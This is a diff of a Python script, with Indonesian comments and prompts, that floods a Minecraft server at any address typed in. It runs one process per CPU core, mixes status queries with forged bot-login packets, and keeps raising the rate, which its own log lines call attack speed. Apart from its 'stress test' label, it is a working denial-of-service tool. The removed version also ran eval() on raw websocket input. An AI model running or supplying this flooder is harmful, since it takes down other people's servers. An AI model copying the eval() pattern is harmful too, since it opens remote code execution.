@@ -2,15 +2,12 @@ import asyncio
 import logging
 import random
 import time
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+import aiohttp
 from mcstatus import MinecraftServer
 from multiprocessing import Process, cpu_count
-from typing import List
 
-app = FastAPI()
-
+# Setup logging untuk mencatat hasil ke dalam file log
 logging.basicConfig(filename='server_status.log', level=logging.INFO, format='%(asctime)s - %(message)s')
-connections: List[WebSocket] = []
 
 async def send_status_request(server_address, server_port, retries=3, backoff_factor=1.5):
     try:
@@ -19,50 +16,42 @@ async def send_status_request(server_address, server_port, retries=3, backoff_fa
         status = await server.async_status()
         latency = (time.time() - start_time) * 1000  # Latency dalam milidetik
 
-        result = f"Server is online, {status.players.online} players online. Latency: {latency:.2f} ms"
+        result = f"Server online, {status.players.online} players. Latency: {latency:.2f} ms"
         logging.info(result)
-        return result
+        print(result)
 
     except Exception as e:
         if retries > 0:
             wait_time = random.uniform(1, 3) * backoff_factor
             await asyncio.sleep(wait_time)
-            return await send_status_request(server_address, server_port, retries - 1, backoff_factor * 1.5)
+            await send_status_request(server_address, server_port, retries - 1, backoff_factor * 1.5)
         else:
             logging.error(f"Request gagal: {e}")
-            return f"Request gagal: {e}"
+            print(f"Request gagal: {e}")
 
-@app.websocket("/ws")
-async def websocket_endpoint(websocket: WebSocket):
-    await websocket.accept()
-    connections.append(websocket)
-
+async def send_bot_request(session, server_address, server_port):
     try:
-        while True:
-            data = await websocket.receive_text()
-            message = eval(data)
+        player_name = f"Bot_{random.randint(1000, 9999)}_{random.choice(['X', 'Z', 'A', 'Q', 'Y'])}"
+        packet = f"\x00\x04\x00{player_name}"
+        await session.post(f"http://{server_address}:{server_port}", data=packet)
+        logging.info(f"Bot {player_name} sent successfully.")
+        print(f"Bot {player_name} sent successfully.")
 
-            if message['action'] == 'start':
-                server_address = message['address']
-                server_port = message['port']
-                num_requests = 300
-                request_rate = 50
-                num_cores = cpu_count()
-
-                for i in range(num_cores):
-                    process = Process(target=start_process, args=(server_address, server_port, i, num_requests, request_rate))
-                    process.start()
-                
-                await websocket.send_text('{"log": "Stress test started successfully."}')
-
-            elif message['action'] == 'stop':
-                await websocket.send_text('{"log": "Stress test stopped."}')
-                break
-
-    except WebSocketDisconnect:
-        connections.remove(websocket)
     except Exception as e:
-        await websocket.send_text(f'{"log": "Error: {str(e)}"}')
+        logging.error(f"Bot Login Error: {e}")
+        print(f"Bot Login Error: {e}")
+
+async def stress_test(server_address, server_port, process_id, num_requests, request_rate):
+    tasks = []
+    async with aiohttp.ClientSession() as session:
+        for request_id in range(1, num_requests + 1):
+            if random.random() < 0.6:
+                tasks.append(asyncio.create_task(send_status_request(server_address, server_port)))
+            else:
+                tasks.append(asyncio.create_task(send_bot_request(session, server_address, server_port)))
+
+            await asyncio.sleep(1 / request_rate)
+        await asyncio.gather(*tasks)
 
 def start_process(server_address, server_port, process_id, num_requests, request_rate):
     while True:
@@ -75,24 +64,19 @@ def start_process(server_address, server_port, process_id, num_requests, request
         request_rate += random.randint(5, 10)
         logging.info(f"Proses {process_id}: Kecepatan serangan meningkat menjadi {request_rate} requests per detik")
 
-async def stress_test(server_address, server_port, process_id, num_requests, request_rate):
-    tasks = []
-    async with aiohttp.ClientSession() as session:
-        for request_id in range(1, num_requests + 1):
-            if random.random() < 0.6:
-                tasks.append(asyncio.create_task(send_status_request(server_address, server_port)))
-            else:
-                tasks.append(asyncio.create_task(send_bot_request(session, server_address, server_port)))
-            await asyncio.sleep(1 / request_rate)
-        await asyncio.gather(*tasks)
+if __name__ == "__main__":
+    server_address = input("Masukkan alamat server Minecraft: ").strip()
+    server_port = input("Masukkan port server Minecraft: ").strip()
 
-async def send_bot_request(session, server_address, server_port):
-    try:
-        player_name = f"Bot_{random.randint(1000, 9999)}_{random.choice(['X', 'Z', 'A', 'Q', 'Y'])}"
-        packet = f"\x00\x04\x00{player_name}"
-        await session.post(f"http://{server_address}:{server_port}", data=packet)
-        return f"Bot {player_name} sent successfully."
+    num_requests_per_process = 300
+    request_rate = 50
+    num_cores = cpu_count()
 
-    except Exception as e:
-        logging.error(f"Bot Login Error: {e}")
-        return f"Bot Login Error: {e}"
+    processes = []
+    for process_id in range(num_cores):
+        process = Process(target=start_process, args=(server_address, server_port, process_id, num_requests_per_process, request_rate))
+        process.start()
+        processes.append(process)
+
+    for process in processes:
+        process.join()
